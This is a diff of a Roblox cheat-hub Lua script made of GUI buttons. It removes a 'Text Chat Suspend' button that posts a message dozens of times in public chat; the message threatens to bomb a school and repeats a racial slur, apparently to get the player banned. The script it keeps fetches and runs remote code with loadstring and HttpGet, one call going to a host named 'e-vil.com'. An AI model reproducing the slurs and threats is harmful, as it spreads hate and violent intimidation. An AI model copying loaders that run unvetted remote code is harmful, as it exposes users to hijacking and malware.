@@ -20,37 +20,8 @@ loadstring(game:HttpGet("https://gist.githubusercontent.com/MelonsStuff/78525269
 
 end)
 
-MainSection:NewButton("Text Chat Suspend", "only for just a baseplate", function()
-    game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("im gonna bomb a fucking school i hate niggers i fucking hate niggers ")
-game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("im gonna bomb a fucking school i hate niggers i fucking hate niggers ")
-game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("im gonna bomb a fucking school i hate niggers i fucking hate niggers ")
-game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("im gonna bomb a fucking school i hate niggers i fucking hate niggers ")
-game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("im gonna bomb a fucking school i hate niggers i fucking hate niggers ")
-game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("im gonna bomb a fucking school i hate niggers i fucking hate niggers ")
-game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("im gonna bomb a fucking school i hate niggers i fucking hate niggers ")
-game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("im gonna bomb a fucking school i hate niggers i fucking hate niggers ")
-game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("im gonna bomb a fucking school i hate niggers i fucking hate niggers ")
-game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("im gonna bomb a fucking school i hate niggers i fucking hate niggers ")
-game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("im gonna bomb a fucking school i hate niggers i fucking hate niggers ")
-game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("im gonna bomb a fucking school i hate niggers i fucking hate niggers ")
-game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("im gonna bomb a fucking school i hate niggers i fucking hate niggers ")
-game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("im gonna bomb a fucking school i hate niggers i fucking hate niggers ")
-game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("im gonna bomb a fucking school i hate niggers i fucking hate niggers ")
-game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("im gonna bomb a fucking school i hate niggers i fucking hate niggers ")
-game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("im gonna bomb a fucking school i hate niggers i fucking hate niggers ")
-game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("im gonna bomb a fucking school i hate niggers i fucking hate niggers ")
-game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("im gonna bomb a fucking school i hate niggers i fucking hate niggers ")
-game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("im gonna bomb a fucking school i hate niggers i fucking hate niggers ")
-game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("im gonna bomb a fucking school i hate niggers i fucking hate niggers ")
-game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("im gonna bomb a fucking school i hate niggers i fucking hate niggers ")
-game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("im gonna bomb a fucking school i hate niggers i fucking hate niggers ")
-game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("im gonna bomb a fucking school i hate niggers i fucking hate niggers ")
-game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("im gonna bomb a fucking school i hate niggers i fucking hate niggers ")
-game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("im gonna bomb a fucking school i hate niggers i fucking hate niggers ")
-game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("im gonna bomb a fucking school i hate niggers i fucking hate niggers ")
-game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("im gonna bomb a fucking school i hate niggers i fucking hate niggers ")
-game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("im gonna bomb a fucking school i hate niggers i fucking hate niggers ")
-game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("im gonna bomb a fucking school i hate niggers i fucking hate niggers ")
+MainSection:NewButton("Patched", "only for just a baseplate", function()
+    
 end)
 
 MainSection:NewButton("Portal Gun", "only for just a baseplate", function()
@@ -83,20 +54,4 @@ StealABrainrotSection:NewButton("BrainrotHub", "idk lmaooo", function()
     loadstring(game:HttpGet("https://e-vil.com/anbu/awin.lua"))()
 end)
 
-
--- Example: Sending a message from the client
-local TextChatService = game:GetService("TextChatService")
-local player = game.Players.LocalPlayer
-
--- Get the general channel
-local generalChannel = TextChatService.TextChannels.RBXGeneral
-
--- Function to display a chat message
-local function displayChatMessage(message, speakerName)
-    generalChannel:DisplaySystemMessage(message, speakerName)
-end
-
--- Example usage:
-displayChatMessage("Made By 6vmzz XD Inverted On Top", player.Name)
-
--- You can also use TextChatService:DisplayBubble() for bubble chat [1].
+game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("made by inverted NOW LOADING INVERTED HUB MUAHAHAHHAHAHAAH")
